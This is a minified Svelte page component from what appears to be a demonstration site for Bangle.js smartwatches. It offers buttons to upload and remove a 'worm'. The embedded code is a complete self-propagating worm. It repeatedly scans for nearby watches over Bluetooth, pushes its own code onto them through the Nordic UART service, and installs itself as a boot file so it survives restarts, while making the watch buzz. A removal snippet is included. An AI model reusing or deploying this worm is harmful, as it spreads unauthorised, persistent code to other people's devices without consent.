import{S as B,i as C,s as P,y as w,a as h,z as O,c as p,A as k,b,g as M,d as N,B as W,h as u,I as D,k as d,q as y,l as _,m as v,r as R,n as A,G as m,M as S,H as T,N as z}from"../chunks/index.5c2a7ae1.js";import{C as E,a as U,s as q,c as x}from"../chunks/Controls.927ec693.js";const j=`let WORM_MAIN = \`
let connect = function(r){var k,l,m,n,f,h={write:function(a){return new Promise(function b(g,e){a.length?(n.writeValue(a.substr(0,20)).then(function(){b(g,e)}).catch(e),a=a.substr(20)):g()})},disconnect:function(){return k.disconnect()},eval:function(a){return new Promise(function(c,g){function e(){var d=b.indexOf("\\n");if(0<=d){clearTimeout(p);f=p=void 0;var q=b.substr(0,d);try{c(JSON.parse(q))}catch(t){g(q)}b.length>d+1&&h.emit("data",b.substr(d+1))}}var b="";var p=setTimeout(e,5E3);f=function(d){b+=d;0<=b.indexOf("\\n")&&e()};h.write("\\u0003\\u0010Bluetooth.write(JSON.stringify("+a+")+'\\\\n')\\n").then(function(){})})}};return r.gatt.connect().then(function(a){k=a;return k.getPrimaryService("6e400001-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){l=a;return l.getCharacteristic("6e400002-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){n=a;return l.getCharacteristic("6e400003-b5a3-f393-e0a9-e50e24dcca9e")}).then(function(a){m=a;m.on("characteristicvaluechanged",function(c){c=E.toString(c.target.value.buffer);f?f(c):h.emit("data",c)});return m.startNotifications()}).then(function(){return h})};
let WORM_PAYLOAD = setInterval(() => {
	Bangle.buzz();
	console.log('Buzz!');
	NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
		connect(dev).then((u) => u.write(WORM_MAIN));
	});
}, 5000);

require('Storage').write('worm.boot.js', WORM_MAIN + '\\\\n' + 'eval(WORM_MAIN);' + '\\\\n');
\`;

eval(WORM_MAIN);
`,J=`clearInterval(WORM_PAYLOAD);
require('Storage').erase('worm.boot.js');
`;function I(s){let t,o,c,a,r,n,e,i;return{c(){t=d("div"),o=d("button"),c=y("Upload Worm"),a=h(),r=d("button"),n=y("Remove Worm"),this.h()},l(f){t=_(f,"DIV",{id:!0,class:!0});var l=v(t);o=_(l,"BUTTON",{});var g=v(o);c=R(g,"Upload Worm"),g.forEach(u),a=p(l),r=_(l,"BUTTON",{});var $=v(r);n=R($,"Remove Worm"),$.forEach(u),l.forEach(u),this.h()},h(){A(t,"id","worm-commands"),A(t,"class","svelte-8q5v8f")},m(f,l){b(f,t,l),m(t,o),m(o,c),m(t,a),m(t,r),m(r,n),e||(i=[S(o,"click",s[3]),S(r,"click",s[4])],e=!0)},p:T,d(f){f&&u(t),e=!1,z(i)}}}function L(s){let t,o,c,a,r;t=new E({});let n=s[0]&&I(s);return a=new U({}),{c(){w(t.$$.fragment),o=h(),n&&n.c(),c=h(),w(a.$$.fragment)},l(e){O(t.$$.fragment,e),o=p(e),n&&n.l(e),c=p(e),O(a.$$.fragment,e)},m(e,i){k(t,e,i),b(e,o,i),n&&n.m(e,i),b(e,c,i),k(a,e,i),r=!0},p(e,[i]){e[0]?n?n.p(e,i):(n=I(e),n.c(),n.m(c.parentNode,c)):n&&(n.d(1),n=null)},i(e){r||(M(t.$$.fragment,e),M(a.$$.fragment,e),r=!0)},o(e){N(t.$$.fragment,e),N(a.$$.fragment,e),r=!1},d(e){W(t,e),e&&u(o),n&&n.d(e),e&&u(c),W(a,e)}}}function V(s,t,o){let c;D(s,x,i=>o(0,c=i));async function a(){await q(j.replace(`
`,""))}async function r(){await q(J)}return[c,a,r,()=>a(),()=>r()]}class G extends B{constructor(t){super(),C(this,t,V,L,P,{})}}export{G as default};
